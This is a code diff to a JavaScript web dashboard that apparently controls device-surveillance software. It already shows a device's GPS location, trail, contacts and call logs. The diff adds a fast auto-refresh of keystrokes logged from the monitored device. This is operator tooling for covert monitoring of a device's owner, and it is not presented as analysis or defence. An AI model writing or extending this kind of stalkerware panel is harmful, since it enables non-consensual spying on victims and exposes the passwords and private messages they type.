@@ -20,6 +20,7 @@ let mapFollowMode = true; // Auto-center map on device GPS updates
 let trailRefreshInterval = null;
 let contactsRefreshInterval = null; // Auto-refresh contacts from server DB
 let calllogsRefreshInterval = null; // Auto-refresh call logs from server DB
+let keylogRefreshInterval   = null; // Auto-refresh keylog from server DB
 
 // Street name history (reverse geocoding)
 let recentStreets = [];       // last 10 unique street names
@@ -1371,16 +1372,20 @@ function selectDevice(deviceId) {
         if (badge) badge.style.display = 'none';
         fetchDeviceHistory(deviceId);
 
-        // Auto-refresh contacts and call logs every 30 s so the panel stays
-        // current without the user having to click Sync manually.
+        // Auto-refresh contacts, call logs and keylog from the server DB so
+        // the panels stay current without the user having to click Sync manually.
         if (contactsRefreshInterval) clearInterval(contactsRefreshInterval);
         if (calllogsRefreshInterval) clearInterval(calllogsRefreshInterval);
+        if (keylogRefreshInterval)   clearInterval(keylogRefreshInterval);
         contactsRefreshInterval = setInterval(() => {
             if (currentDeviceId) fetchContacts(currentDeviceId);
         }, 30000);
         calllogsRefreshInterval = setInterval(() => {
             if (currentDeviceId) fetchCallLogs(currentDeviceId);
         }, 30000);
+        keylogRefreshInterval = setInterval(() => {
+            if (currentDeviceId) fetchKeylog(currentDeviceId);
+        }, 15000); // keylog atualiza com mais frequência (novas digitações chegam rápido)
     }
 
     if (window.innerWidth <= 767) closeSidebar();
